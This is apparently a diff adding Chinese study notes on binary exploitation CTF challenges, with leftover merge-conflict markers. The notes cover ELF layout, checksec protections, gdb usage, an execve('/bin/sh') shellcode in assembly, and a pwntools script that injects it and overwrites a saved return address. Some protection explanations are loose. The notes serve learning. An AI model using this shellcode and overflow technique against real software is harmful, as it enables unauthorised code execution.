@@ -544,3 +544,231 @@ will be a2 a1 ..file
 是否有对应格式 如果有会启动对应的解释器
 - 动态链接程序 通过对应的inter 执行
 
+<<<<<<< HEAD
+=======
+# section vs segement:
+```
+一、Section（节）—— 静态结构（供链接器使用）
+每个 ELF 文件都有多个 Section，如 .text、.data、.bss、.rodata、.symtab、.strtab 等。
+
+它们记录了代码、数据、符号表、字符串表、调试信息等。
+
+作用：
+
+供链接器使用（如 ld）
+
+提供重定位、符号解析等功能
+
+对象文件（.o）主要关注 section，执行文件或库也会保留它们（特别是带调试信息时）。
+
+二、Segment（段）—— 动态结构（供加载器使用）
+每个 ELF 文件也有多个 Segment，如 PT_LOAD、PT_INTERP、PT_DYNAMIC 等。
+
+每个 segment 描述了可执行文件运行时的内存映射（比如代码段、数据段等）。
+
+作用：
+
+供加载器（如 Linux 的 ld.so）使用
+
+
+```
+
+# 金丝雀 
+开始结束放入一个随机值。必须确保改值不被改变
+# ASLR 随机地址分布：
+可以通过修改末端字节来在同页面移动
+
+
+# 查看文件启用安全选项：
+```
+hacker@binary-exploitation~your-first-overflow-hard:~$ checksec /challenge/binary-exploitation-first-overflow
+[*] '/challenge/binary-exploitation-first-overflow'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+
+```
+checksec:
+```
+1. RELRO (Full RELRO)
+Full RELRO 表示程序启用了完整的 Read-Only Relocations（只读重定位）保护。这可以防止攻击者修改程序的重定位表，增强了程序的安全性。
+
+Partial RELRO 是较弱的保护，可能允许某些攻击绕过，而 Full RELRO 则更强大。
+
+2. Stack (Canary found)
+Canary found 表示启用了 栈保护（Stack Smashing Protector），即使用了所谓的 "canary" 技术来防止缓冲区溢出攻击。栈保护通过在函数的栈帧中插入一个特殊值（canary），如果溢出发生并覆盖了栈上的返回地址，程序就能检测到并终止，从而防止溢出攻击。
+
+3. NX (NX enabled)
+NX enabled 表示启用了 非执行堆栈（No eXecute，NX）。这项技术将堆栈区域标记为不可执行，从而防止攻击者利用溢出攻击执行恶意代码。
+
+这使得攻击者即使成功执行了缓冲区溢出，也无法在堆栈上执行 shellcode。
+
+4. PIE (No PIE)
+No PIE 表示程序没有启用 位置无关可执行文件（Position Independent Executable）。PIE 是一种技术，它使得程序的地址在每次运行时都发生变化，从而增加了攻击者的破解难度。
+
+如果启用了 PIE，程序的基地址会随机化，攻击者无法预先知道程序的确切地址，降低了攻击的成功率。
+
+5. SHSTK (Enabled)
+SHSTK enabled 表示启用了 堆栈保护，即使栈本身的可执行标志被禁用，堆栈的保护措施仍然有效，进一步增加了安全性。
+
+6. IBT (Enabled)
+IBT enabled 表示启用了 Indirect Branch Tracking。这是一个新的安全功能，用于防止某些类型的控制流攻击，如 Jump-Oriented Programming（JOP）和 Return-Oriented Programming（ROP）。它通过追踪间接跳转来加强安全性。
+
+7. Stripped (No)
+No 表示该二进制文件没有被剥离（stripped）。通常，剥离操作会移除调试符号和符号表，减小文件大小，并使逆向工程变得更加困难。然而，保留符号信息可以方便调试和分析程序。
+
+```
+
+# 表面紧邻的变量并不一定是连载一起的。
+考虑一下对齐
+
+# 函数进入时候的内存分布
+返回地址
+push rbp 带来的原始栈基址 同时，新的rbp  指向这里
+
+变量...
+...
+
+...
+
+# 常用命令：
+gdb: x/gx
+反汇编指定函数：
+objdump -d
+objdump -d ./challenge --disassemble=main --disassemble=win_authed
+# pwntools gddb:
+```py
+def main():
+    print("Hello from ctf-playground!")
+from pwn import * 
+
+from pwnlib import gdb
+import os
+# import gdb
+files = os.listdir("/home/kokona/proj_lib/ctf_playground/challenge/")
+file =filter(lambda x:not x.endswith((".c",".md")),files)
+gdb_script = '''
+b challenge 
+c
+printf "rsp+8: %p\\n", $rsp+8
+
+
+'''
+if __name__ == "__main__":
+    url = os.path.dirname(os.path.abspath(__file__)) + "/challenge/" + next(file)
+    print(url)
+    # p = process(url)
+    gdber = gdb.debug(url, gdbscript=gdb_script)
+    rsp = input("input rsp here:")
+    # assert isinstance(gdber,tube)
+
+    # gdber.gdb.
+    # gdber.sendline(b"c")
+
+
+```
+这里的gdb 很特殊 stdin，并不是接到gdb窗口的
+# shellcode 注入：
+Write your shellcode as assembly:
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+mov rax, 59		# this is the syscall number of execve
+lea rdi, [rip+binsh]	# points the first argument of execve at the /bin/sh string below
+mov rsi, 0		# this makes the second argument, argv, NULL
+mov rdx, 0		# this makes the third argument, envp, NULL
+syscall			# this triggers the system call
+binsh:				# a label marking where the /bin/sh string is
+.string "/bin/sh"
+```
+
+Then, assemble it!
+注解：
+nonstdlib作用：不要标准库 static：不要动态链接
+gcc -nostdlib -static shellcode.s -o shellcode-elf
+This is an ELF with your shellcode as its .text. You still need to extract it:
+objcopy --dump-section .text=shellcode-raw shellcode-elf
+The resulting shellcode-raw file contains the raw bytes of your shellcode.
+This is what you would inject as part of your exploits.
+直接调试
+```
+gcc -nostdlib -static shellcode.s -o shellcode-elf
+	./shellcode-elf
+```
+也可以使用strace查看系统调用
+https://docs.google.com/presentation/d/1kkfh-dhgxfIZPB1ziyW2JQiC1MbQWn8c7e24kOoDxJ4/edit?pli=1&slide=id.g9605bf3899_1_129#slide=id.g9605bf3899_1_129
+
+
+
+# 寄存器内部当大端：
+```
+mov ebx,0x67616c66
+shl rbx,8
+mov bl,0x2f
+
+```
+最后是67....2f
+
+# 未知bug:
+p.sendline(shellcode)
+会输入0a.(回车一并输入)
+经过测试，是由于输送间隔太短的原因。
+```py
+
+from pwn import * 
+import os
+context.terminal = ["tmux","splitw","-h"] 
+files = os.listdir("/challenge/")
+file =filter(lambda x:not x.endswith((".c",".md")),files)
+gdb_script = '''
+
+'''
+if __name__ == "__main__":
+    url =  "/challenge/" + next(file)
+    # 0x00005c56e905b345 
+    p = process(url)
+    with open("./shellcode-raw","rb") as f:
+        shellcode = f.read(4096)
+    rbp = 2**64-1  # Example value, replace with actual rbp address
+    p = process(url)  # SIGSTOP to pause the process
+
+    ret_addr =0x15870000
+    p.send(shellcode)
+    p.recvuntil(b"Press enter to continue!")
+    p.sendline(b"")
+    p.sendline(b"A"*0x30 +rbp.to_bytes(8,"little")+ret_addr.to_bytes(8,"little"))
+    # print(p.recvall(1).decode())
+    print(p.recvall(1).decode())
+# 
+
+#     rbp = 2**64-1  # Example value, replace with actual rbp address
+#     for i in range(16): 
+#         p = process(url)  # SIGSTOP to pause the process
+
+#         ret_addr = 0xb8f + i * 0x1000
+#         num_bits = 2
+#         print(i)
+#         p.send(b"\x00"+b"A"*0x6f +rbp.to_bytes(8,"little")+ret_addr.to_bytes(2,"little"))
+#         print(p.recvall().decode())
+# # 
+```
+
+# 
+
+# web 服务器段存储的密码是hash mima
+
+# 各个地址：
+    network = Network("router", hosts={
+        alice_host: "10.0.0.1",
+        bob_host: "10.0.0.2",
+        mallory_host: "10.0.0.3",
+        sharon_host: "10.0.0.4",
+        hacker_host: "10.0.0.5",
+    })
+>>>>>>> 38578d7 (...sth save)
